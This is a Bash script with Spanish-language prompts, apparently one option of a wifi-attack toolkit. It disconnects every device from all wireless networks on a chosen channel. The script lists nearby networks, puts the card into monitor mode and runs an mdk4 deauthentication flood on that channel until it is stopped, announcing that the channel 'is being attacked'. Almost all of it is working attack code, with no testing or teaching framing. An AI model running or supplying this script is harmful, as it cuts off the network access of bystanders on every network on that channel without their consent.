#!bin/bash

source installer.sh

card
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
check_wifi_mode $interfaz
check_managed $mode
#Fin#
Title
echo "[8] Desconectar a todas las Redes Wifi de un Canal"
echo 
echo "[#] Copia el CHAN del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
echo
echo
sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo nmcli dev wifi list && sleep 9999999999" &
read -p "[*] Copia el Canal (CHAN) Objetivo y pegelo a continuacion: " ch
sudo pkill gnome-terminal
#Activar Modo Monitor
ActMonitor
#Fin#
Title
echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten a las Redes Wifi)"
echo
echo
echo "========================================================================================="
echo "                            El Canal ($ch) esta siendo Atacado"
echo "========================================================================================="
echo
sudo gnome-terminal --geometry 100x34+1300+20 -- sudo airodump-ng $interfaz2 --band abg &
sleep 2
sudo mdk4 $interfaz2 d -c $ch
sudo pkill gnome-terminal
echo
echo
#Desactivar Modo Monitor
DesaMonitor
#Fin#
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc3
	case $opc3 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/8.sh
				;;
			3 )	exit
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
